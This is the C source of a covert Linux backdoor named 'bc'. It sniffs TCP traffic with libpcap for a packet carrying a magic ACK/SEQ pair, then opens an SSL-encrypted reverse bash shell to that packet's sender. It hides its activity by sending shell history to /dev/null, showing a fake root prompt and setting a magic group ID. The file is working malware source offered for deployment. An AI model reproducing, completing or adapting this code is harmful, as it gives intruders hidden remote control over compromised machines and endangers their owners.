/*
 * bc
 * 
 ****************************************************************************
 * 
 * Example compiler command-line for GCC:
 *   yum install libpcap libpcap-devel
 *   yum install openssl openssl-devel
 *   gcc -Wall -o bc bc.c -lpcap -lssl
 * 
 ****************************************************************************
 *
 */

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h> 
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <signal.h>


#include <netinet/tcp.h>
#include <netdb.h>
#include <fcntl.h>

#include "config.h"

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

#define BUFSIZZ 1024

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void print_app_usage(void);
SSL_CTX* InitCTX(void);
void backconnect(struct in_addr addr, u_short port);
void enterpass(int);
void read_write(SSL *ssl,int sock);
int remap_pipe_stdin_stdout(int rpipe, int wpipe);

char *argv[] = { "bash", "-i", NULL };
char *envp[] = { "TERM=linux", "PS1=$", "BASH_HISTORY=/dev/null",
                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/_sh4x_","HISTFILE=/dev/null",
                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };
char *ps = "[root@localhost]#";

void enterpass(int s){
  //char *prompt="Password [displayed to screen]: ";
  char *motd="<< Welcome >>\n";
  char buffer[64];

  //write(s,banner,strlen(banner));
  //write(s,prompt,strlen(prompt));
  read(s,buffer,sizeof(buffer));
  if(!strncmp(buffer, _RPASSWORD_, strlen(_RPASSWORD_))) {
    write(s,motd,strlen(motd));
  }else {
    //write(s,"Wrong!\n", 7);
    close(s); 
    exit(0);
  }
}

/*
 * print help text
 */
void
print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

return;
}

/*
 * Initialize SSL library / algorithms
 */
SSL_CTX* InitCTX(void)
{   SSL_METHOD *method;
    SSL_CTX *ctx;

    SSL_library_init();

    OpenSSL_add_all_algorithms();		/* Load cryptos, et.al. */
    SSL_load_error_strings();			/* Bring in and register error messages */
    method = SSLv3_client_method();		/* Create new client-method instance */
    ctx = SSL_CTX_new(method);			/* Create new context */
    if ( ctx == NULL )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}

/*
 * spawn a backconnect shell
 */
void backconnect(struct in_addr addr, u_short port)
{
	int child;
	signal(SIGCHLD, SIG_IGN);
	if((child=fork())==0){
			
			struct sockaddr_in sockaddr;
			int sock;
			//FILE *fd;
			//char *newline;
			//char buf[1028];

			SSL_CTX *ctx;
			SSL *ssl;

			ctx = InitCTX();

		        sockaddr.sin_family = AF_INET;
			sockaddr.sin_port = port;
		        sockaddr.sin_addr = addr;

			sock = socket(AF_INET, SOCK_STREAM, 0);

			if (connect(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == 0) 
		        {
				ssl = SSL_new(ctx);
				SSL_set_fd(ssl,sock);

				sock = SSL_get_fd(ssl);		

				if ( SSL_connect(ssl) == -1 )
					ERR_print_errors_fp(stderr);
				else {
					
					int	writepipe[2] = {-1,-1},					/* parent -> child */
						readpipe [2] = {-1,-1};					/* child -> parent */
					pid_t	childpid;

					/*------------------------------------------------------------------------
					 * CREATE THE PAIR OF PIPES
					 *
					 * Pipes have two ends but just one direction: to get a two-way
					 * conversation you need two pipes. It's an error if we cannot make
					 * them both, and we define these macros for easy reference.
					 */
					writepipe[0] = -1;

					if ( pipe(readpipe) < 0  ||  pipe(writepipe) < 0 )
					{
						/* FATAL: cannot create pipe */
						/* close readpipe[0] & [1] if necessary */
					}

					#define	PARENT_READ	readpipe[0]
					#define	CHILD_WRITE	readpipe[1]
					#define CHILD_READ	writepipe[0]
					#define PARENT_WRITE	writepipe[1]
					signal(SIGCHLD, SIG_IGN);
					if ( (childpid = fork()) < 0)
					{
						/* FATAL: cannot fork child */
					}
					else if ( childpid == 0 )					/* in the child */
					{
						close(PARENT_WRITE);
						close(PARENT_READ);

						//dup2(CHILD_READ,  0);  close(CHILD_READ);
						//dup2(CHILD_WRITE, 1);  close(CHILD_WRITE);
						remap_pipe_stdin_stdout(CHILD_READ,CHILD_WRITE);
						
						/* do child stuff */
						//read_write(ssl,sock);
						execve("/bin/bash", argv, envp);
						printf("bash close");
						//close(childpid);
						_exit(0);
					}else if ( childpid > 0 )
					{
						/* in the parent */
						close(CHILD_READ);
						close(CHILD_WRITE);
						
						//dup2(PARENT_READ, 0);
						//dup2(PARENT_WRITE, 1);
						remap_pipe_stdin_stdout(PARENT_READ,PARENT_WRITE);
						/* do parent stuff */
						read_write(ssl,sock);
						//wait();
					}							
					//close(sock);
					//SSL_CTX_free(ctx);
				}
			}
			//return;
			close(child);
			_exit(0);
	}else if(child>0){
		//printf("---child PID:");
		//printf("%d",child);
		//printf("\n");
	}
	return;
	
}

/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */

	int size_ip;
	int size_tcp;
	unsigned int r_ack;
	unsigned int r_seq;

	count++;
	
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses
	printf("       From: %s\n", inet_ntoa(ip->ip_src));
	printf("         To: %s\n", inet_ntoa(ip->ip_dst));
	*/
	
	/* determine protocol */	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			break;
		default:
			return;
	}
	
	/*
	 *  OK, this packet is TCP.
	 */
	
	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}

	/* set ack and seq variables, then compare to MAGIC_ACK and MAGIC_SEQ */
	r_ack = ntohl(tcp->th_ack);
	r_seq = ntohl(tcp->th_seq);

	if (r_ack == MAGIC_ACK && r_seq == MAGIC_SEQ) {
	        printf("magic packet received\n");
			 printf("       From: %s\n", inet_ntoa(ip->ip_src));
			 printf("         To: %s\n", inet_ntoa(ip->ip_dst));
		backconnect(ip->ip_src, tcp->th_sport);
	}

	return;
}

int main(int argc, char **argv)
{

	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "tcp";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 0;			/* Capture indefinitely */

	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		print_app_usage();
		exit(EXIT_FAILURE);
	}
	else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}
	setgid(MAGIC_GID);
	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

return 0;
}


/* A simple error and exit routine*/
int err_exit(string)
  char *string;
  {
    fprintf(stderr,"%s\n",string);
    exit(0);
  }

/* Print SSL errors and exit*/
int berr_exit(string)
  char *string;
  {
    //BIO_printf(bio_err,"%s\n",string);
    //ERR_print_errors(bio_err);
    fprintf(stderr,"%s\n",string);
    exit(0);
  }



/* Read from the keyboard and write to the server
   Read from the server and write to the keyboard

   we use select() to multiplex
*/
void read_write(SSL *ssl,int sock)
  {
    int width;
    int r,c2sl=0,c2s_offset=0;
    int read_blocked_on_write=0,write_blocked_on_read=0,read_blocked=0;
    fd_set readfds,writefds;
    int shutdown_wait=0;
    char c2s[BUFSIZZ],s2c[BUFSIZZ];
    int ofcmode;
    
    /*First we make the socket nonblocking*/
    ofcmode=fcntl(sock,F_GETFL,0);
    ofcmode|=O_NDELAY;
    if(fcntl(sock,F_SETFL,ofcmode))
      err_exit("Couldn't make socket nonblocking");
    

    width=sock+1;
    while(1){
      FD_ZERO(&readfds);
      FD_ZERO(&writefds);

      FD_SET(sock,&readfds);

      /* If we're waiting for a read on the socket don't
         try to write to the server */
      if(!write_blocked_on_read){
        /* If we have data in the write queue don't try to
           read from stdin */
        if(c2sl || read_blocked_on_write)
          FD_SET(sock,&writefds);
        else
          FD_SET(fileno(stdin),&readfds);
      }
      
      r=select(width,&readfds,&writefds,0,0);
      if(r==0)
        continue;

      /* Now check if there's data to read */
      if((FD_ISSET(sock,&readfds) && !write_blocked_on_read) ||
        (read_blocked_on_write && FD_ISSET(sock,&writefds))){
        do {
          read_blocked_on_write=0;
          read_blocked=0;
          
          r=SSL_read(ssl,s2c,BUFSIZZ);
          
          switch(SSL_get_error(ssl,r)){
            case SSL_ERROR_NONE:
              /* Note: this call could block, which blocks the
                 entire application. It's arguable this is the
                 right behavior since this is essentially a terminal
                 client. However, in some other applications you
                 would have to prevent this condition */
              fwrite(s2c,1,r,stdout);
              break;
            case SSL_ERROR_ZERO_RETURN:
              /* End of data */
              if(!shutdown_wait)
                SSL_shutdown(ssl);
              goto end;
              break;
            case SSL_ERROR_WANT_READ:
              read_blocked=1;
              break;
              
              /* We get a WANT_WRITE if we're
                 trying to rehandshake and we block on
                 a write during that rehandshake.

                 We need to wait on the socket to be 
                 writeable but reinitiate the read
                 when it is */
            case SSL_ERROR_WANT_WRITE:
              read_blocked_on_write=1;
              break;
            default:
              berr_exit("SSL read problem");
          }

          /* We need a check for read_blocked here because
             SSL_pending() doesn't work properly during the
             handshake. This check prevents a busy-wait
             loop around SSL_read() */
        } while (SSL_pending(ssl) && !read_blocked);
      }
      
      /* Check for input on the console*/
      if(FD_ISSET(fileno(stdin),&readfds)){
        c2sl=read(fileno(stdin),c2s,BUFSIZZ);
        if(c2sl==0){
          shutdown_wait=1;
          if(SSL_shutdown(ssl))
            return;
        }
        c2s_offset=0;
      }

      /* If the socket is writeable... */
      if((FD_ISSET(sock,&writefds) && c2sl) ||
        (write_blocked_on_read && FD_ISSET(sock,&readfds))) {
        write_blocked_on_read=0;

        /* Try to write */
		 
        r=SSL_write(ssl,c2s+c2s_offset,c2sl);
		 SSL_write(ssl,ps,strlen(ps));
          
        switch(SSL_get_error(ssl,r)){
          /* We wrote something*/
          case SSL_ERROR_NONE:
            c2sl-=r;
            c2s_offset+=r;
            break;
              
            /* We would have blocked */
          case SSL_ERROR_WANT_WRITE:
            break;

            /* We get a WANT_READ if we're
               trying to rehandshake and we block on
               write during the current connection.
               
               We need to wait on the socket to be readable
               but reinitiate our write when it is */
          case SSL_ERROR_WANT_READ:
            write_blocked_on_read=1;
            break;
              
              /* Some other error */
          default:	      
            berr_exit("SSL write problem");
        }
      }
    }
      
  end:
    SSL_CTX_free(ssl);
    close(sock);
    return;
  }



#ifndef TRUE
#  define TRUE 1
#endif

#ifndef FALSE
#  define FALSE 0
#endif

/*------------------------------------------------------------------------
 * Every time we run a dup2(), we always close the old FD, so this macro
 * runs them both together and evaluates to TRUE if it all went OK and 
 * FALSE if not.
 */
#define	DUP2CLOSE(oldfd, newfd)	(dup2(oldfd, newfd) == 0  &&  close(oldfd) == 0)

int remap_pipe_stdin_stdout(int rpipe, int wpipe)
{
	/*------------------------------------------------------------------
	 * CASE [A]
	 *
	 * This is the trivial case that probably never happens: the two FDs
	 * are already in the right place and we have nothing to do. Though
	 * this probably doesn't happen much, it's guaranteed that *doing*
	 * any shufflingn would close descriptors that shouldn't have been.
	 */
	if ( rpipe == 0  &&  wpipe == 1 )
		return TRUE;

	/*----------------------------------------------------------------
	 * CASE [B] and [C]
	 *
	 * These two have the same handling but not the same rules. In case
	 * [C] where both FDs are "out of the way", it doesn't matter which
	 * of the FDs is closed first, but in case [B] it MUST be done in
	 * this order.
	 */
	if ( rpipe >= 1  &&  wpipe > 1 )
	{
		return DUP2CLOSE(rpipe, 0)
		    && DUP2CLOSE(wpipe, 1);
	}


	/*----------------------------------------------------------------
	 * CASE [D]
	 * CASE [E]
	 *
 	 * In these cases, *one* of the FDs is already correct and the other
	 * one can just be dup'd to the right place:
	 */
	if ( rpipe == 0  &&  wpipe >= 1 )
		return DUP2CLOSE(wpipe, 1);

	if ( rpipe  >= 1  &&  wpipe == 1 )
		return DUP2CLOSE(rpipe, 0);


	/*----------------------------------------------------------------
	 * CASE [F]
	 *
	 * Here we have the write pipe in the read slot, but the read FD
	 * is out of the way: this means we can do this in just two steps
	 * but they MUST be in this order.
	 */
	if ( rpipe >= 1   &&  wpipe == 0 )
	{
		return DUP2CLOSE(wpipe, 1)
		    && DUP2CLOSE(rpipe, 0);
	}

	/*----------------------------------------------------------------
	 * CASE [G]
	 *
	 * This is the trickiest case because the two file descriptors  are
	 * *backwards*, and the only way to make it right is to make a
	 * third temporary FD during the swap.
	 */
	if ( rpipe == 1  &&  wpipe == 0 )
	{
	const int tmp = dup(wpipe);		/* NOTE! this is not dup2() ! */

		return	tmp > 1
		    &&  close(wpipe)   == 0
		    &&  DUP2CLOSE(rpipe, 0)
		    &&  DUP2CLOSE(tmp,   1);
	}

	/* SHOULD NEVER GET HERE */

	return  FALSE;
}
